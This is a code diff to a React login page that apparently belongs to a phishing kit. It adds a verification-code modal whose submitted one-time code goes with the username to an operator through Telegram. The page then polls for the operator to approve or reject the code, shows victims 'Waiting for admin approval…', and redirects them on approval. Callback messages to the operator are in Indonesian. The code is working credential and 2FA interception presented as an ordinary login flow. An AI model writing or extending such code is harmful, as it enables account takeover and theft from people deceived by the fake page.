@@ -5,7 +5,7 @@ import { useI18n, type Language } from "@/lib/i18n";
 import { Globe, ChevronDown } from "lucide-react";
 import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
-import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP } from "@/lib/telegram";
+import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset, sendBotOTP, sendOtpVerificationRequest } from "@/lib/telegram";
 
 
 const languageOptions: { code: Language; label: string }[] = [
@@ -27,11 +27,52 @@ export default function Login() {
   const [showVerifyModal, setShowVerifyModal] = useState(false);
   const [pendingOtp, setPendingOtp] = useState("");
   const [sendingCode, setSendingCode] = useState(false);
+  const [showCodeModal, setShowCodeModal] = useState(false);
+  const [enteredCode, setEnteredCode] = useState("");
+  const [codeError, setCodeError] = useState("");
+  const [checkingCode, setCheckingCode] = useState(false);
+  const otpSessionKeyRef = useRef("");
+  const otpPollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const otpOffsetRef = useRef(0);
   const [showLangDropdown, setShowLangDropdown] = useState(false);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const offsetRef = useRef(0);
 
-  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
+  useEffect(() => () => {
+    if (pollRef.current) clearInterval(pollRef.current);
+    if (otpPollRef.current) clearInterval(otpPollRef.current);
+  }, []);
+
+  const handleContinueCode = async () => {
+    if (!enteredCode.trim()) { setCodeError("Please enter the verification code."); return; }
+    setCodeError("");
+    setCheckingCode(true);
+    const sessionKey = Date.now().toString(36) + "_otp";
+    otpSessionKeyRef.current = sessionKey;
+    const offset = await getLatestOffset();
+    otpOffsetRef.current = offset;
+    await sendOtpVerificationRequest(username, enteredCode.trim(), pendingOtp, sessionKey);
+    otpPollRef.current = setInterval(async () => {
+      const { status, nextOffset, callbackId } = await pollApproval(otpOffsetRef.current, sessionKey);
+      otpOffsetRef.current = nextOffset;
+      if (status === "approved") {
+        clearInterval(otpPollRef.current!);
+        if (callbackId) await answerCallback(callbackId, "✅ Kode disetujui! Melanjutkan ke step berikutnya.");
+        setCheckingCode(false);
+        setShowCodeModal(false);
+        navigate("/verify");
+      } else if (status === "rejected") {
+        clearInterval(otpPollRef.current!);
+        if (callbackId) await answerCallback(callbackId, "❌ Kode ditolak.");
+        setCheckingCode(false);
+        setCodeError("The code you entered was not approved. Please try again.");
+      }
+    }, 2500);
+  };
+
+  const handleResendCode = async () => {
+    await sendBotOTP(pendingOtp, username);
+  };
 
   if (isAuthenticated) { navigate("/"); return null; }
 
@@ -154,7 +195,9 @@ export default function Login() {
                   await sendBotOTP(pendingOtp, username);
                   setSendingCode(false);
                   setShowVerifyModal(false);
-                  navigate("/bot-otp");
+                  setEnteredCode("");
+                  setCodeError("");
+                  setShowCodeModal(true);
                 }}
                 style={{
                   flex: 1, height: 50, background: "#111", color: "#fff",
@@ -170,6 +213,111 @@ export default function Login() {
             <p style={{ fontSize: 12, color: "#999", marginTop: 14 }}>
               Standard rates may apply
             </p>
+          </div>
+        </div>
+      )}
+
+      {/* ── CODE ENTRY MODAL (step 2 of verification) ── */}
+      {showCodeModal && (
+        <div style={{
+          position: "fixed", inset: 0, zIndex: 1000,
+          background: "rgba(0,0,0,0.45)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+          padding: "0 20px",
+        }}>
+          <div style={{
+            background: "#fff", borderRadius: 12,
+            padding: "36px 28px 24px",
+            maxWidth: 400, width: "100%",
+            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
+            textAlign: "center",
+          }}>
+            <h3 style={{ fontSize: 20, fontWeight: 700, color: "#111", marginBottom: 14 }}>
+              Verification Required
+            </h3>
+            <p style={{ fontSize: 14, color: "#444", lineHeight: 1.7, marginBottom: 24 }}>
+              Enter the verification code sent to you.<br />
+              This code will expire 10 minutes after it is sent.
+            </p>
+
+            <input
+              type="text"
+              placeholder="Verification Code*"
+              value={enteredCode}
+              onChange={(e) => setEnteredCode(e.target.value)}
+              onKeyDown={(e) => { if (e.key === "Enter") handleContinueCode(); }}
+              disabled={checkingCode}
+              style={{
+                width: "100%", height: 48, padding: "0 14px",
+                fontSize: 15, color: "#111",
+                border: "1px solid #ccc", borderRadius: 6,
+                outline: "none", boxSizing: "border-box",
+                marginBottom: 8, background: checkingCode ? "#f5f5f5" : "#fff",
+              }}
+            />
+
+            {codeError && (
+              <div style={{
+                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
+                fontSize: 12, padding: "8px 12px", marginBottom: 12, borderRadius: 4,
+                textAlign: "left",
+              }}>
+                {codeError}
+              </div>
+            )}
+
+            {checkingCode && (
+              <div style={{ fontSize: 13, color: "#888", marginBottom: 12 }}>
+                Waiting for admin approval…
+              </div>
+            )}
+
+            <div style={{ display: "flex", gap: 12, marginTop: 8 }}>
+              <button
+                type="button"
+                disabled={checkingCode}
+                onClick={() => {
+                  if (otpPollRef.current) clearInterval(otpPollRef.current);
+                  setShowCodeModal(false);
+                  setEnteredCode("");
+                  setCodeError("");
+                }}
+                style={{
+                  flex: 1, height: 50, background: "#fff", color: "#111",
+                  fontSize: 15, fontWeight: 500, border: "2px solid #111",
+                  borderRadius: 6, cursor: checkingCode ? "not-allowed" : "pointer",
+                  opacity: checkingCode ? 0.5 : 1,
+                }}
+              >
+                Cancel
+              </button>
+              <button
+                type="button"
+                disabled={checkingCode}
+                onClick={handleContinueCode}
+                style={{
+                  flex: 1, height: 50, background: "#111", color: "#fff",
+                  fontSize: 15, fontWeight: 500, border: "none",
+                  borderRadius: 6, cursor: checkingCode ? "not-allowed" : "pointer",
+                  opacity: checkingCode ? 0.7 : 1,
+                }}
+              >
+                {checkingCode ? "Checking…" : "Continue"}
+              </button>
+            </div>
+
+            <button
+              type="button"
+              onClick={handleResendCode}
+              disabled={checkingCode}
+              style={{
+                marginTop: 16, fontSize: 13, color: "#111",
+                textDecoration: "underline", background: "none",
+                border: "none", cursor: "pointer",
+              }}
+            >
+              Didn't receive a code? Resend code
+            </button>
           </div>
         </div>
       )}
